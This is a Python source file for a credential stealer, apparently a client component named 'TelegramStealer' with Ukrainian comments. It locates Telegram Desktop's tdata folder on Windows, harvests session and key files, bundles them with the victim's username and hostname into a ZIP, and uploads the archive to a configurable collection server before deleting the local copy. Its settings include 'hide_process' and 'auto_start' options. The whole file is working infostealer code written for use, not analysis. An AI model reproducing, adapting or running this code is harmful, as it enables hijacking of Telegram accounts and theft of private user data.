# client/stealer.py
import os
import sys
import json
import platform
from pathlib import Path
import zipfile
import requests
import tempfile
import logging

class TelegramStealer:
    def __init__(self, config_path="config.json"):
        self.config = self.load_config(config_path)
        self.setup_logging()
        
    def load_config(self, config_path):
        """Завантаження конфігурації"""
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {
                "server_url": "http://localhost:5000/api/upload",
                "admin_id": "1", 
                "target_admin": "admin",
                "features": ["tdata", "sessions"],
                "auto_start": True,
                "hide_process": True
            }
    
    def setup_logging(self):
        """Налаштування логування"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
    
    def find_telegram_paths(self):
        """Пошук шляхів до Telegram Desktop"""
        system = platform.system()
        paths = []
        
        if system == "Windows":
            appdata = os.getenv('APPDATA')
            telegram_desktop = os.path.join(appdata, 'Telegram Desktop', 'tdata')
            
            if os.path.exists(telegram_desktop):
                paths.append(('telegram_desktop', telegram_desktop))
                self.logger.info(f"Found Telegram Desktop: {telegram_desktop}")
            else:
                self.logger.warning(f"Telegram Desktop not found: {telegram_desktop}")
        
        return paths
    
    def collect_data(self, paths):
        """Збір даних згідно з обраними функціями"""
        collected_files = []
        features = self.config.get('features', [])
        
        for source_name, path in paths:
            self.logger.info(f"Scanning {source_name}: {path}")
            
            try:
                if 'tdata' in features:
                    collected_files.extend(self.collect_tdata(path, source_name))
                
                if 'sessions' in features:
                    collected_files.extend(self.collect_sessions(path, source_name))
                    
            except Exception as e:
                self.logger.error(f"Error scanning {path}: {e}")
        
        return collected_files
    
    def collect_tdata(self, tdata_path, source_name):
        """Збір tdata файлів"""
        collected = []
        
        try:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Збираємо тільки важливі tdata файли
                    if self.is_tdata_file(file_path):
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read()
                            
                            collected.append({
                                'path': file_path,
                                'source': source_name,
                                'content': content,
                                'size': len(content),
                                'type': 'tdata'
                            })
                            
                            self.logger.info(f"Collected tdata: {os.path.basename(file_path)}")
                            
                        except Exception as e:
                            self.logger.error(f"Error reading {file_path}: {e}")
                            
        except Exception as e:
            self.logger.error(f"Error walking tdata {tdata_path}: {e}")
        
        return collected
    
    def collect_sessions(self, tdata_path, source_name):
        """Збір session файлів"""
        collected = []
        
        try:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Шукаємо session файли
                    if file.endswith('.session') or file.endswith('.session-journal'):
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read()
                            
                            collected.append({
                                'path': file_path,
                                'source': source_name,
                                'content': content,
                                'size': len(content),
                                'type': 'session'
                            })
                            
                            self.logger.info(f"Collected session: {os.path.basename(file_path)}")
                            
                        except Exception as e:
                            self.logger.error(f"Error reading {file_path}: {e}")
                            
        except Exception as e:
            self.logger.error(f"Error walking sessions {tdata_path}: {e}")
        
        return collected
    
    def is_tdata_file(self, file_path):
        """Перевірка чи файл є важливим tdata файлом"""
        important_names = ['D877', 'map', 'key_datas', 'user_data', 'usertag']
        filename = os.path.basename(file_path).lower()
        
        return any(name in filename for name in important_names)
    
    def create_zip_archive(self, collected_files):
        """Створення ZIP архіву"""
        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as tmp_file:
                archive_path = tmp_file.name
            
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                # Додаємо конфігурацію
                zipf.writestr('config.json', json.dumps(self.config, indent=2))
                
                # Додаємо файли
                for item in collected_files:
                    folder = item['type']
                    arcname = f"{folder}/{os.path.basename(item['path'])}"
                    zipf.writestr(arcname, item['content'])
            
            self.logger.info(f"Archive created: {archive_path}")
            return archive_path
            
        except Exception as e:
            self.logger.error(f"Error creating archive: {e}")
            return None
    
    def send_to_server(self, archive_path):
        """Відправка на сервер"""
        try:
            with open(archive_path, 'rb') as f:
                files = {'file': (os.path.basename(archive_path), f, 'application/zip')}
                data = {
                    'admin_id': self.config.get('admin_id'),
                    'client_id': json.dumps({
                        'system': platform.system(),
                        'username': os.getenv('USERNAME') or os.getenv('USER'),
                        'hostname': platform.node(),
                        'features': self.config.get('features', []),
                        'auto_start': self.config.get('auto_start', False),
                        'hide_process': self.config.get('hide_process', False)
                    })
                }
                
                response = requests.post(
                    self.config.get('server_url'),
                    files=files,
                    data=data,
                    timeout=30
                )
                
                if response.status_code == 200:
                    self.logger.info("Data sent successfully")
                    return True
                else:
                    self.logger.error(f"Server error: {response.status_code}")
                    return False
                    
        except Exception as e:
            self.logger.error(f"Error sending data: {e}")
            return False
    
    def run(self):
        """Головна функція"""
        self.logger.info("Starting Telegram Stealer...")
        self.logger.info(f"Features: {self.config.get('features', [])}")
        self.logger.info(f"Auto start: {self.config.get('auto_start', False)}")
        self.logger.info(f"Hide process: {self.config.get('hide_process', False)}")
        
        # Пошук Telegram
        paths = self.find_telegram_paths()
        if not paths:
            self.logger.warning("No Telegram installations found")
            return False
        
        self.logger.info(f"Found {len(paths)} Telegram installation(s)")
        
        # Збір даних
        collected_files = self.collect_data(paths)
        if not collected_files:
            self.logger.warning("No files collected")
            return False
        
        # Статистика по типах
        tdata_count = len([f for f in collected_files if f['type'] == 'tdata'])
        session_count = len([f for f in collected_files if f['type'] == 'session'])
        
        self.logger.info(f"Collected {len(collected_files)} files (tdata: {tdata_count}, sessions: {session_count})")
        
        # Створення архіву
        archive_path = self.create_zip_archive(collected_files)
        if not archive_path:
            return False
        
        # Відправка на сервер
        success = self.send_to_server(archive_path)
        
        # Очистка
        try:
            if os.path.exists(archive_path):
                os.remove(archive_path)
        except:
            pass
        
        return success

def main():
    """Точка входу"""
    try:
        stealer = TelegramStealer()
        success = stealer.run()
        
        if success:
            print("✅ Stealer completed successfully!")
        else:
            print("❌ Stealer failed!")
            
        # Пауза для демонстрації
        input("Press Enter to exit...")
        
    except Exception as e:
        print(f"💥 Error: {e}")
        input("Press Enter to exit...")

if __name__ == "__main__":
    main()